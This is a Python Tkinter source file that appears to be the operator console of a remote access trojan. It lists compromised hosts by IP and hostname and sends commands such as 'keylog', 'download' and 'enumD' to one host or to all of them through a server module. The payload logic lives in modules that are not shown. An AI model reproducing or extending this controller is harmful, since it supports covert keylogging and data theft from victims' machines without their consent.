import db
import Connection
from Tkinter import *
import Tkinter as tk
import ttk
import server

class Client:
    root = Tk()
    globals()['textVar'] = StringVar(root)
    frame = Frame(root, height="200", width="200")
    text = Text(frame, height=25, width=55)
    _server = server.Server(text)
    textVar = StringVar(root)
    client = StringVar(root)
    clientMenu = None
    cmd = StringVar(root)

    DB = db.DB()
    connections = DB.getAllConnectionsPrint()
    for i in range(len(connections)):
       connections[i] = str(connections[i]["ip"]) + " - " + str(connections[i]["hostname"])

    commandsAvailable = ["showC", "help", "download", "enumD", "keylog", "quit"]

    @staticmethod
    def redrawClientMenu():
        Client.clientMenu['menu'].delete(0, 'end')
        for i in Client.connections:
            Client.clientMenu['menu'].add_command(label=i, command=tk._setit(Client.client, i))

    @staticmethod
    def createWindow():
        Client.root.title("Client")
        Client.root.config(height=500, width=500)
        s = Scrollbar(Client.frame)
        Client.text.pack(side=LEFT, fill=Y)
        s.pack(side=RIGHT, fill=Y)
        s.config(command=Client.text.yview)
        Client.text.config(yscrollcommand=s.set)
        Client.text.config(state=DISABLED)

        Client.client.set("Select Client")
        Client.clientMenu = OptionMenu(Client.root, Client.client, "All", *Client.connections)
        Client.clientMenu.place(relx=.1, rely=.85)

        Client.cmd.set("Select Command")
        cmdMenu = OptionMenu(Client.root, Client.cmd, *Client.commandsAvailable)
        cmdMenu.place(relx=.40, rely=.85)

        Client.frame.place(relx=.1, rely=.1)

        button = Button(Client.root, text="enter", command=Client.clickEnter)
        button.place(relx=.75, rely=.852)

        st = Button(Client.root, text="start", command=Client.start)
        st.place(relx=.1, rely=.03)
        Client.root.protocol("WM_DELETE_WINDOW", Client.onClose)
        Client.root.mainloop()

    @staticmethod
    def onClose():
        Client.DB.REMOVEALL()
        Client.root.destroy()

    @staticmethod
    def start():
        Client._server.startServer()

    @staticmethod
    def clickEnter():
        comd = Client.cmd.get()
        cli = Client.client.get().split(" - ")
        l = [Connection.Connection(cli[0], cli[1], "s"), comd]
        Client._server.whatDo(l)

    @staticmethod
    def updateTextbox(s):
        Client.textVar.set(s)
        return 1
